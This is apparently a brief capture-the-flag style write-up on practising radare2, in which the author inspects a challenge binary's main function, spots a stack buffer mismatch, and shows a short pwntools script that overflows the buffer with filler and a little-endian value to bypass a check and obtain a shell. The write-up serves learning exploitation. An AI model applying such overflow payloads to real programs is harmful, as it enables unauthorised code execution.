
#Solving random challenge for practicing radare2

will add binary soon. <br />
let's div in... <br />
<br />
starting it with `AAA` to analyze all and then `pdf @main`
then we see following.

![](https://github.com/0x7EVEN/Blogs/blob/main/images/Buffer/boi/3.png?raw=true)

as we see this is not our input so we need to somehow bypass this check or modify the value.<br/>

by analyzing variables in stack we see there is some mismatch in buffer of input and distance in address.<br/>
hmm , now we make payload 
```python3
from pwn import *
p = process("./bine")
payload  = "0"*0x14 + "\xee\xba\xf3\xca" #little endien
p.send(payload)

p.interactive()
```
and we got shell...

![shell](https://github.com/0x7EVEN/Blogs/blob/main/images/Buffer/boi/9.png?raw=true)
